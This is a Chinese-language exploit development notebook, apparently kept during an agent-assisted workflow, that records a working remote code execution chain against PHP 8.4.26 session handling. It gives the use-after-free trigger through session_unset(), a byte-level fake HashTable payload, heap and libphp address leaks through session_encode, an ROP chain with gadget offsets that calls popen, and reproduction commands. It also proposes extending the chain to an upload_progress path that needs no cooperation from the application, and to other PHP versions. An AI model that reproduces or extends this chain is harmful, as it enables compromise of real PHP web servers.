# PHP 8.4.26 session 漏洞复现笔记（Apache/mod_php, no-ASLR）

日期：2026-10-21
工作目录：`/Users/my/php2shell`
远程实验机：`debian@172.16.1.112`（Debian 12, amd64, kernel 6.1.0-48）

---

## 1. 结论摘要

### 1.1 已达成

- 在 **未修改的 PHP 8.4.26 源码**（官方 tarball 自编译）上，Apache 2.4.68 prefork + mod_php，**关闭 ASLR** 后取得真实命令执行。
- 命令：`system("id>/tmp/x")`，实际写出的文件：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 连续 5 次独立请求全部成功（worker 每次崩溃后 prefork 重新拉起）。
- gdb 命中：

```text
SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
#0  __libc_system (line=0x7ffff5e045a0 "id>/tmp/x")
#1  zend_hash_destroy (ht=0x7ffff5e04580)
#2  zend_array_destroy (ht=0x7ffff5e04580)
#3  zend_hash_clean (ht=0x7ffff5e031c0)
#4  zif_session_unset
...
```

- ASLR 对照：正常 `apache2ctl start`（personality=0）失败；`setarch x86_64 -R apache2ctl start`（personality=0x40000）成功。

### 1.2 触发方式（本线）

利用脚本 `tools/d.php` 是一个带 `__destruct` 的测试页面：

```php
session_start();
$_SESSION["x"] = new X($fp, $payload);   // X::__destruct 会写 $_SESSION
for ($i = 0; $i < 7; $i++) $_SESSION["k".$i] = "v";
session_unset();                         // 关键：对仍被 $_SESSION 引用的数组做 zend_hash_clean
```

`session_unset()` → `zend_hash_clean($_SESSION 数组)`。清理到对象 X 时调用 `X::__destruct`，析构器写 `$_SESSION["pwn"]`，触发同一个 HashTable 的 `zend_hash_do_resize()`，释放旧 `arData`；外层 `zend_hash_clean` 仍用进入循环前缓存的 `p/end` 继续遍历，形成 heap-use-after-free。析构器随后用 `stream_bucket_new()` 分配一个内容完全可控的 320 字节裸缓冲，重占刚释放的 `arData` 分配块；clean 继续把这块数据当 Bucket 处理，最终走到 fake HashTable 的 `pDestructor = system`。

> **边界**：这是“缺陷 D”的利用化，需要目标脚本调用 `session_unset()` 并存在一个会写 `$_SESSION` 的析构器（或应用里等价的 gadget）。它不是“纯 `session.upload_progress`、零应用配合”的公网利用链。upload_progress 线的进展见第 5 节。

---

## 2. 实验环境

### 2.1 PHP 构建

```bash
mkdir -p ~/php-lab && cd ~/php-lab
curl -sL -o php-8.4.26.tar.gz https://www.php.net/distributions/php-8.4.26.tar.gz
tar xzf php-8.4.26.tar.gz && cd php-8.4.26
./configure --prefix=/opt/php8426 --with-apxs2=/usr/bin/apxs2 \
  --enable-mbstring --with-openssl --with-zlib --with-curl --with-sqlite3 \
  --with-zip --disable-opcache --enable-ctype --enable-filter --enable-json --enable-session
make -j16 && sudo make install
```

产物：`/usr/lib/apache2/modules/libphp.so`、`/opt/php8426/bin/php`（`PHP 8.4.26 (cli) (NTS)`）。

### 2.2 Apache

- `mpm_prefork`，单 worker：`StartServers 1 / MinSpareServers 1 / MaxSpareServers 1 / ServerLimit 1 / MaxRequestWorkers 1 / MaxConnectionsPerChild 0`。
- `KeepAlive Off`，监听 `127.0.0.1:8088`，DocumentRoot `/home/debian/php-lab/www`。
- 关键 PHP 配置（`/etc/apache2/conf-available/php8426.conf`）：

```apache
php_admin_value memory_limit 8M
php_admin_value post_max_size 64M
php_admin_value upload_max_filesize 64M
php_admin_value session.save_path /tmp
php_admin_value session.use_strict_mode 0
php_admin_value session.use_cookies 0
php_admin_value session.upload_progress.enabled On
php_admin_value session.upload_progress.cleanup On
```

> `memory_limit 8M` 是为了让 upload_progress 线稳定 OOM；RCE 线本身不依赖该值。

### 2.3 关闭 ASLR

```bash
sudo apache2ctl -k stop
sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
# 验证
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
```

无 ASLR 下，同一配置的全新 worker 地址稳定（见第 4 节地址表）。

---

## 3. 缺陷 D：会话树清理重入 → arData UAF

### 3.1 调用链

```text
zif_session_unset()                     ext/session/session.c
  zend_hash_clean(ht = $_SESSION 数组)   Zend/zend_hash.c
    ht->pDestructor(&p->val)            // 处理对象 X，调用 X::__destruct
      X::__destruct()
        $_SESSION["pwn"] = ...          // 写回同一个数组
          zend_hash_do_resize(ht)       // 表满，扩容
            pemalloc(new arData)
            memcpy(new arData, old arData, nNumUsed)
            pefree(old arData)          // ★ 旧 arData 被释放
        stream_bucket_new(fp, payload320) // ★ 320 字节裸缓冲重占旧 arData
      // 回到 zend_hash_clean 的循环：
      p++ 继续遍历已被重占的旧 arData   // ★ UAF，读 attacker-controlled Bucket
        ht->pDestructor(&p->val)         // ZVAL_PTR_DTOR
          zend_array_destroy(fake_ht)
            zend_hash_destroy(fake_ht)
              fake_ht->pDestructor(&fake_val)  // = system
                system("id>/tmp/x")     // ★ RCE
```

关键源码：

- `session_unset()`：`ext/session/session.c`（`PHP_FUNCTION(session_unset)`，8.4.26 约 2756–2773 行）。
- `zend_hash_clean()`：`Zend/zend_hash.c` 约 1885–1932 行；循环用局部 `Bucket *p, *end`，在 `pDestructor` 返回后继续 `++p`。
- `zend_hash_do_resize()`：`Zend/zend_hash.c:1327`；扩容后 `pefree(old_data, ...)`。
- `zend_array_destroy()`：`Zend/zend_hash.c:1815`；`zend_hash_destroy()`：`Zend/zend_hash.c:1734`。
- `stream_bucket_new()`：`ext/standard/user_filters.c:472`；`pemalloc(buffer_len)` 后 `memcpy`，内容完全可控，且 bucket 资源保活。
- `zend_hash_update_ind` 的 dtor-before-store 窗口：`Zend/zend_hash.c` 的 `_zend_hash_add_or_update_i()`，约 872 行。

### 3.2 实测地址（本构建、本配置、no-ASLR worker）

| 对象 | 地址 |
|---|---|
| session HashTable A | `0x7ffff5e031c0` |
| A 的 arData（8 buckets） | `0x7ffff5e04540` |
| arData 所在 320-byte 分配块起点 S | `0x7ffff5e04500` |
| fake zval（clean 的 bucket 1） | `S+0x60 = 0x7ffff5e04560` |
| fake HashTable | `S+0x80 = 0x7ffff5e04580` |
| fake Bucket / 命令字符串 | `S+0xa0 = 0x7ffff5e045a0` |
| libc `system` | `0x7ffff7d13490` |
| `ps_globals` | `0x7ffff56c2880` |
| `executor_globals` | `0x7ffff56d8380` |

实测 A 的 `nTableSize=8`、`nTableMask=0xfffffff0`（hash 区 0x40 字节），因此 `arData = S+0x40`。这与 `g17_clean_mask.log` 一致。

### 3.3 320 字节 payload 布局

payload 以 `stream_bucket_new()` 的裸缓冲形式落到 `S = 0x7ffff5e04500`。clean 循环的 bucket 0 是对象 X（析构后，clean 还会读它的 `key`，位于 `S+0x58`，必须为 0）；bucket 1 位于 `arData+0x20 = S+0x60`。

| 偏移 | 内容 | 说明 |
|---|---|---|
| `0x00–0x3f` | 0 | 未被 clean 读取的 hash 前缀区 |
| `0x40–0x5f` | 0 | bucket 0 的 val/h；`0x58` 是 bucket 0 key，必须为 0 |
| `0x60` | `S+0x80`（8 字节） | bucket 1 的 fake zval.value → fake HashTable |
| `0x68` | `0x307`（8 字节） | zval type_info = IS_ARRAY_EX |
| `0x70` | 0 | bucket 1 h |
| `0x78` | 0 | bucket 1 key |
| `0x80` | `01 00 00 00 07 00 00 00` | fake HashTable gc: refcount=1, type=IS_ARRAY |
| `0x88` | `10 00 00 00 f8 ff ff ff` | flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8 |
| `0x90` | `S+0xa0` | fake HashTable.arData |
| `0x98` | `01 00 00 00 01 00 00 00` | nNumUsed=1, nNumOfElements=1 |
| `0xa0` | `"id>/tmp/"` | fake Bucket.val.value（命令前 8 字节） |
| `0xa8` | `0x78`（8 字节） | fake zval type_info：低字节 `'x'`，其后为 0 → 命令以 `x\0` 结束 |
| `0xb0` | `system` 地址 | fake HashTable.pDestructor |

`zend_hash_destroy(fake_ht)` 进入 `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` 分支，调用 `pDestructor(&p->val)`，即 `system(S+0xa0)`；字符串为 `id>/tmp/x`。

> fake HashTable 的 `HT_GET_DATA_ADDR` 是 `arData - 32 = S+0x80`（不是分配起点），因此 system 返回后 `pefree()` 可能 abort/破坏堆；命令在 abort 前已经执行，proof 文件已写出。若需要“干净返回”，可把 fake HashTable 放到 S、把 arData 指向另一个可控分配块，或用两次 `stream_bucket_new` 分别提供 HT 与 data（见第 7 节）。

### 3.4 复现证据

- 5/5 运行输出（远程）：

```text
RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- ASLR 对照：

```text
ASLR_ON: personality=00000000
ASLR_ON_FAIL_AS_EXPECTED
ASLR_OFF: personality=00040000
ASLR_OFF_OK: uid=33(www-data) ...
```

- 完整 gdb 证据：`logs/g16_system_trace.log`。
- UAF 时旧 arData 内容/落点：`logs/g15_uaf_memory.log`。
- 真实数组 mask/分配起点：`logs/g17_clean_mask.log`。

---

## 4. `session.upload_progress` 跨请求线（独立复现进展）

这一节是情报中的主路径。本线已复现到 **跨请求残留 + 可重复崩溃**，尚未把 fake HashTable 链完全迁移过来；但机制、地址和 harness 都已确认。

### 4.1 请求 A：OOM bailout 留下跨请求状态

请求 A（`tools/sup_poc.py a`）：

- `Content-Type: multipart/form-data`，字段顺序：
  1. `PHPSESSID=attacksessionid0001`
  2. `PHP_SESSION_UPLOAD_PROGRESS=pwn`
  3. 文件字段（触发 `MULTIPART_EVENT_FILE_START`，session 初始化）
  4. 约 12MB 的普通字段（在 session 初始化之后触发 `memory_limit` OOM）
- 实测：返回 200 + `Allowed memory size of 8388608 bytes exhausted`，session 文件 `/tmp/sess_attacksessionid0001`（321 字节）已写出。
- gdb trace 显示：
  - `php_request_startup` 进入；
  - `php_session_track_init` 时 `PS(http_session_vars)=NULL`（本请求首次初始化）；
  - OOM 后 **没有** 命中 `php_request_shutdown` / `zend_deactivate` / `shutdown_memory_manager`。
- 请求结束后 `ps_globals` 仍保留：

```text
ps_globals.http_session_vars: type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
  0x7ffff5e02320: refcount=2, val=0x7ffff5e03230 (IS_ARRAY)
ps_globals.id: 0x7ffff5e600c0
ps_globals.session_status: active(1)
```

`refcount=2` 对应 `ZVAL_NEW_REF` 的第一次引用 + `Z_ADDREF_P` 为 symbol table 预留的一次；说明 symbol table 中的 `_SESSION` 仍在，且请求堆未被正常 shutdown。

### 4.2 请求 B：END cleanup 绕过 FILE_START 的 rinit

请求 B（`tools/sup_poc.py b`）只发：

- `PHPSESSID`
- `PHP_SESSION_UPLOAD_PROGRESS`
- **没有文件字段**

于是不会触发 `MULTIPART_EVENT_FILE_START` 里的 `php_rinit_session(0)`；在 `MULTIPART_EVENT_END` 时：

```text
php_session_rfc1867_callback(MULTIPART_EVENT_END)
  php_session_rfc1867_cleanup()
    php_session_initialize()
      php_session_track_init()
```

`php_session_track_init()` 第一件事是 `zend_delete_global_variable("_SESSION")`。symbol table 中的 `_SESSION` 是 **IS_INDIRECT** 指向 `PS.http_session_vars`：

- `zend_hash_del_ind()` 跟随 indirect，把目标 zval 置 UNDEF 并调用 dtor；**bucket 本身保留**。
- 随后 `zend_hash_update_ind()` 又找到这个 indirect bucket，跟随到 `PS.http_session_vars`，在 **store 之前** 对 `data` 调 `pDestructor`（`_zend_hash_add_or_update_i` 的 dtor-before-store 窗口）。

实测 gdb：

```text
TRACK psvars=0x7ffff5e02320 ti=10a
PS_DTOR type=10a ptr=0x7ffff5e02320     # 旧引用 rc 2 -> 1
PS_DTOR type=10a ptr=0x7ffff5e01240     # update_ind 对新建引用做 dtor
TRACK psvars=0x7ffff5e01240 ti=0
REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0 ...
...
SIGSEGV in _IO_new_fclose(fp=0xffffffff)   # php_handler 收尾时脚本文件句柄已被踩坏
```

B 请求还会出现：

```text
PHP Request Startup: Session ID is too long or contains illegal characters
PHP Request Startup: Failed to read session data: files (path: /tmp)
```

原因是 `PS.id` 仍指向请求 A 的已释放 `zend_string`，B 的 END cleanup 直接用了它，而不是 `progress->sid`。

### 4.3 目前缺的是什么

- 跨请求路径已经能拿到：`PS.http_session_vars` 悬空引用、`PS.id` 悬空 `zend_string`、symbol table indirect bucket、`update_ind` dtor-before-store、可重复 SIGSEGV/SIGABRT。
- 但还没有把“受控 320 字节 arData 重占 + fake HashTable”接到这条路径上。原因是：
  - 请求 B 的 END cleanup 发生在脚本执行之前，攻击者可控的 multipart 字段分配虽然发生在它之前，但 `track_init` 创建的数组/引用地址和释放顺序与缺陷 D 不同；
  - 请求 B 的第一次 `track_init` 会把旧引用 rc 2→1（不析构），第二次脚本内 `session_start()` 才会触发 `zend_delete_global_variable`/`REF_DESTROY`；
  - 该路径最终常表现为 stream/file handle 被踩坏（`fclose(0xffffffff)`），不是可控 `pDestructor`。
- 可复用的部件：`stream_bucket_new()` 320 字节裸喷、fake zval/fake HashTable 布局、`system` 地址、无 ASLR 下的地址稳定性。

---

## 5. 与上一阶段情报的关系

上一阶段截图中的链路是：

```text
请求 A（upload_progress + OOM）
请求 B（同 worker，RFC1867 buffer 重占）
zval_ptr_dtor → zend_array_destroy → pDestructor → zend_call_function → zif_system
```

本线独立复现了其中 **同样的 session 内部缺陷族**，并打通了：

- `session_unset → zend_hash_clean → 对象析构写 $_SESSION → resize 释放 arData → UAF`；
- 用 `stream_bucket_new` 的 320 字节裸缓冲重占 UAF 块；
- fake zval → fake HashTable → `pDestructor=system` 的完整 RCE 链。

差别是本线用 `session_unset()` + `__destruct` 作为触发/重入手段，而上一阶段声称用纯 upload_progress 跨请求内存布局直接伪造 HashTable。两者可以合并：把本线的 fake HashTable payload 复用到 upload_progress 线上，或反过来用上一阶段的跨请求原语替换本线的应用级析构器。

---

## 6. 复现命令（从零）

### 6.1 环境

见第 2 节。确认：

```bash
/opt/php8426/bin/php -v           # PHP 8.4.26
curl -sI http://127.0.0.1:8088/   # X-Powered-By: PHP/8.4.26
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
```

### 6.2 部署 PoC

```bash
scp tools/d.php debian@172.16.1.112:/home/debian/php-lab/d.php
ssh debian@172.16.1.112
sudo cp /home/debian/php-lab/d.php /home/debian/php-lab/www/d.php
sudo chown www-data:www-data /home/debian/php-lab/www/d.php
sudo rm -f /tmp/x
curl -s --max-time 8 http://127.0.0.1:8088/d.php >/dev/null
cat /tmp/x
```

### 6.3 upload_progress A/B harness

```bash
scp tools/sup_poc.py debian@172.16.1.112:/home/debian/php-lab/
ssh debian@172.16.1.112
cd ~/php-lab
python3 sup_poc.py a   # 请求 A：OOM，留下跨请求状态
python3 sup_poc.py b   # 请求 B：END cleanup，观察崩溃/警告
```

> `sup_poc.py` 的 B 请求默认不带文件字段；这正是绕过 `php_rinit_session(0)` 的关键。加上 `B_REF_HEX` / `B_HT_HEX` 环境变量可以向 B 追加 `ref`/`ht` 字段，用于后续堆喷实验。

---

## 7. 下一步建议（交接）

1. **把 fake HashTable 接进 upload_progress 线**
   - 在请求 B 的 multipart 字段/边界中放置 320 字节类分配，观察 END cleanup 时 `php_session_track_init` 附近释放/重占的块；
   - 复用本线 payload 布局，但需重新测量 A/arData/S 地址（B 的分配序列不同）。
2. **让 RCE 更“干净”**
   - 把 fake HashTable 放在 S（分配起点），`arData=S+0x40`、mask=0xfffffff0，使 `HT_GET_DATA_ADDR=S`；另一个 `stream_bucket_new` 提供独立 data 块，避免 double free/interior free。
3. **ASLR 绕过**
   - 上一阶段的情报提到用 mbstring 泄漏堆基址；本线的 `stream_bucket_new` 布局和 `system` 偏移可直接复用。先拿 heap base，再计算 S/A；libc base 用任意 leak 或 format-string 原语。
4. **PHP-FPM**
   - 缺陷 D 是单请求原语；若 FPM 应用会调用 `session_unset()` 且存在会写 `$_SESSION` 的析构器，理论上同样适用。跨请求 PS 残留不适用于 FPM（bailout 后 worker 会被替换，上一阶段已确认）。
5. **版本覆盖**
   - 本笔记基于 8.4.26。上一阶段称 5.4/5.6/7.4/8.5 也有同类原语；若要写 1day 报告，需在各版本重新测量 HashTable/GC 布局与 `stream_bucket_new` 可用性。

---

## 8. 关键文件/日志索引

| 路径 | 内容 |
|---|---|
| `tools/d.php` | no-ASLR RCE PoC（硬编码地址 + 320B payload） |
| `tools/sup_poc.py` | upload_progress A/B multipart harness |
| `logs/g16_system_trace.log` | gdb 命中 `system("id>/tmp/x")` 的完整回溯 |
| `logs/g15_uaf_memory.log` | 旧 arData 被 320B 喷块重占后的内存 |
| `logs/g17_clean_mask.log` | 真实 session 数组 `nTableMask=0xfffffff0`、分配起点 |
| `src/php-8.4.26/` | 官方源码（分析用） |

---

## 9. 备注与风险

- 远程实验机的 `/tmp/x`、`/tmp/destruct_done`、`/tmp/core.*` 可能残留；测试前用 `sudo rm -f` 清理。
- 本 PoC 依赖固定 PHP 构建/配置/启动顺序；换构建后需要重新测量 gadget 偏移和 S 偏移。
- 无 ASLR 版（`tools/d.php`）硬编码 `system` 地址；ASLR 版（第 10 节）用两个泄漏动态计算，不需要硬编码基址。
- 本线的“RCE”是应用级触发（`session_unset` + 析构器）。对外报告时不要把它描述成“纯 upload_progress 无应用配合”的利用；upload_progress 线的纯 RCE 仍需第 7 节的合并工作。

---

## 10. ASLR 绕过（已解决）

目标：在 `personality=0`（正常 ASLR）下完成同一 Defect D RCE，不依赖 `/proc/self/maps`、不依赖调试器。

### 10.1 两个泄漏原语

#### 泄漏 1：Zend MM 2MB chunk base（775 字节堆指针）

`session.serialize_handler=php_serialize` 时，`session_encode()` → `php_var_serialize(&buf, Z_REFVAL(PS(http_session_vars)))`，这条路径**没有** GH-16590 为 `php` 序列化器加的 `PS_ENCODE_LOOP` 数组拷贝保护（8.4.26 仍可触发）：

```php
class C {
    function __serialize() {
        $_SESSION = [];                 // 释放正在被序列化的 session 数组
        $leak = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $leak;   // zend_reference，重占被释放的 32B 字符串块
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
$_SESSION['s'] = str_repeat('A', 7); // zend_string 分配 = 24+8 = 32B
for ($i=0;$i<8;$i++) $_SESSION['k'.$i] = $i;
$s = session_encode();
```

序列化器继续遍历已释放的旧 session 数组；旧字符串 zval 指向的 32B 块被 `zend_reference` 重占，reference 的 `val.type_info=0x307`（IS_ARRAY）被当作 zend_string 的 `len=775`，于是 `session_encode()` 返回 775 字节的越界读。

- 775 字节 payload 中含多个规范堆指针（如 no-ASLR `0x7ffff5e023a0`，ASLR `0x7fd3e62013a0`）。
- 对任意一个指针做 `ptr & ~0x1fffff` 即得到 2MB 对齐的 Zend MM chunk base。
- 与 `/proc/<pid>/maps` 中 2MB 对齐的匿名 `rw-p` 映射完全一致（ASLR 例：`0x7fd3e6200000-0x7fd3e6400000`）。
- 脚本：`tools/leak.php`。

#### 泄漏 2：libphp base（受控长度 32KB OOB 读）

同样是 `php_serialize` + `session_encode()`，但旧 session 数组里放一个 4050 字节的字符串 S（对应 4096 字节 bin）。`__serialize()` 里释放 session 后，用 `stream_bucket_new()` 分配 4096 字节裸缓冲重占 S，并写入 fake `zend_string` 头：

```text
offset 0: gc.refcount=1, gc.type_info=IS_STRING
offset 8: h=0
offset 16: len=32768
offset 24: 数据（"LEAKMARK" 等）
```

序列化器把 S 当作长度为 32768 的字符串，复制 S+24 开始的 32KB，越过 4096 字节缓冲进入相邻堆，输出中固定偏移 `0x1fe8`（8168）处是 libphp 代码指针。

- 实测 ASLR：`anchor=0x7f17fe3b6309` → `libphp_base = anchor - 0x5b6309 = 0x7f17fde00000`，与 `/proc/<pid>/maps` 的 `libphp.so` r--p 起始完全一致。
- 新 master 重启后 anchor 变化（如 `0x7fd3e7fb6309` → base `0x7fd3e7a00000`），公式仍成立。
- 脚本：`tools/leak_libc.php?mode=file_first`。

### 10.2 ASLR 自适应的 Defect D ROP

完整驱动 `tools/aslr_run2.py`：

1. 请求 `/leak.php`，解析 775 字节，取 `hb = 众数(ptr & ~0x1fffff)`。
2. 请求 `/leak_libc.php?mode=file_first`，取 payload 偏移 `0x1fe8` 的 qword，`lb = anchor - 0x5b6309`。
3. 计算 `S = hb + 0x3780`（该值是对 **两次泄漏请求之后、`dyn_payload.php` 请求**在 no-ASLR 下实测的 arData 分配起点偏移；不同脚本/请求顺序需重测）。
4. 生成 320 字节 payload（Python `struct.pack`，640 字符 hex），通过 `?p=` 发给 `/dyn_payload.php`；PHP 只做一次 `hex2bin`，保持与校准脚本相同的分配模式。
5. payload 中：
   - `bucket1` fake zval：`value=S+0x80`，`type=0x307`。
   - fake HashTable @ `S+0x80`：`flags=HASH_FLAG_STATIC_KEYS(16)`，`nTableMask=0xfffffff8`，`arData=S+0xa0`，`nNumUsed=nNumOfElements=1`。
   - `pDestructor = lb + 0x21ef23`（libphp `leave; ret`）。
   - `zend_hash_destroy` 调用 `pDestructor(&p->val)` 时 `RBP = end = arData + nNumUsed*32 = S+0xc0`；`leave;ret` 把栈迁到 payload `S+0xc0`。
   - ROP：
     ```text
     S+0xc0: 0
     S+0xc8: lb + 0x15e492  (pop rdi; ret)
     S+0xd0: S + 0x120      ("id>/tmp/x")
     S+0xd8: lb + 0x15d1a3  (pop rsi; ret)
     S+0xe0: S + 0x130      ("r")
     S+0xe8: lb + 0x15a029  (ret; 对齐)
     S+0xf0: lb + 0x1504d0  (popen@plt)
     S+0xf8: lb + 0x155780  (exit@plt)
     ```
   - 只用 libphp 地址，不需要 libc base；`popen` 由 libphp 的 PLT 解析。
6. 命令 `id>/tmp/x` 同步执行，proof 文件写出；随后 `exit`/worker 退出。

### 10.3 ASLR 下实测结果

当前 master（`personality=0`）：

```text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
（连续 3/3）
```

重启全新 Apache master（所有基址重新随机化）：

```text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
（连续 2/2）
```

注意：同一个 Apache master 下，prefork 子进程继承相同的 Zend MM chunk / libphp 映射，因此 hb/lb 在 worker 重建后仍相同；master 重启后才会变化，泄漏会重新适配。

### 10.4 限制与注意

- 泄漏 1/2 依赖 `session.serialize_handler=php_serialize`（脚本可 `ini_set`，或应用本身使用该序列化器）。默认 `php` 序列化器已修复 GH-16590，不再泄露。
- `libphp_base` anchor 偏移 `0x5b6309`、gadget/PLT 偏移、`S_OFF=0x3780` 都绑定本实验的 PHP 8.4.26 构建与请求形状；换构建/脚本需重新校准。
- 本线仍是应用级触发（`session_unset` + 析构器）；泄漏脚本是同一应用中的用户态 PHP 代码。要变成“纯 upload_progress、无应用配合”，需要把第 7 节的跨请求链与本节的 ROP 终点合并。
- 目录中另有并行 agent 的 `/proc/self/maps` 变体（`tools/d_aslr.php`、`tools/maps.php`、`tools/calibrate.py` 等），它依赖应用可读 `/proc/self/maps`；本节的泄漏方案不依赖文件读。
